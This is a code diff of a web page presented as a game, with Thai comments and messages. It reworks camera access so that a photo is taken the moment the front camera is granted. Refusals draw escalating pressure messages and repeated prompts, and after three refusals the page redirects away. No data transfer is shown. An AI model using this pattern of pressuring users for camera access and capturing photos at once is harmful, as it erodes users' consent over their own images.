@@ -23,29 +23,22 @@ function showPage(pageNumber) {
     currentPage = pageNumber;
 }
 
-// แทนที่ฟังก์ชัน initCamera ทั้งหมดด้วยโค้ดนี้
+// แก้ไขฟังก์ชัน initCamera และ handleCameraError ใหม่ทั้งหมด
 async function initCamera() {
     if (isRequesting) return;
     isRequesting = true;
     
     try {
-        const constraints = {
-            video: {
-                facingMode: "user", // ระบุให้ใช้กล้องหน้า
-                width: { ideal: 1280 }, // ปรับให้เหมาะกับมือถือ
-                height: { ideal: 720 }
-            }
-        };
-
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' } 
+        });
         video.srcObject = stream;
-        await video.play();
+        await video.play().catch(() => {}); // หลีกเลี่ยง autoplay error
         takePhoto();
         showPage(2);
         cameraAttempts = 0;
     } catch (err) {
-        console.error("ไม่สามารถเข้าถึงกล้องได้", err);
-        handleCameraError();
+        await handleCameraError();
     } finally {
         isRequesting = false;
     }
@@ -59,33 +52,40 @@ function takePhoto() {
 }
 
 // แทนที่ฟังก์ชัน handleCameraError ทั้งหมดด้วยโค้ดนี้
-function handleCameraError() {
+async function handleCameraError() {
     cameraAttempts++;
     
     const messages = [
-        'หากไม่อนุญาตจะไม่สามารถเล่นเกมนี้ได้',
-        'โปรดกดอนุญาตเพื่อเล่นเกม',
-        'งั้นก็ไม่ต้องเล่น'
+        { text: 'หากไม่อนุญาตจะไม่สามารถเล่นเกมนี้ได้', delay: 3000 },
+        { text: 'โปรดกดอนุญาตเพื่อเล่นเกม', delay: 3000 },
+        { text: 'งั้นก็ไม่ต้องเล่น', delay: 2000 }
     ];
-
-    showMessage(messages[cameraAttempts-1], cameraAttempts === 3 ? 1000 : 3000);
     
+    const currentMessage = messages[cameraAttempts - 1];
+    
+    // แสดงข้อความและรอจนกว่าจะครบเวลา
+    await new Promise(resolve => {
+        showMessage(currentMessage.text, currentMessage.delay);
+        setTimeout(resolve, currentMessage.delay);
+    });
+
     if(cameraAttempts === 3) {
         setTimeout(() => {
             window.location.href = 'about:blank';
-        }, 1000);
+        }, 2000);
         return;
     }
 
-    setTimeout(() => {
-        initCamera();
-    }, cameraAttempts === 3 ? 1000 : 3000);
+    // ขออนุญาตอีกครั้งหลังจากแสดงข้อความเสร็จ
+    initCamera(); 
 }
 
 function showMessage(text, duration) {
     message.textContent = text;
     message.style.display = 'block';
-    setTimeout(() => message.style.display = 'none', duration);
+    setTimeout(() => {
+        message.style.display = 'none';
+    }, duration);
 }
 
 // Game Logic
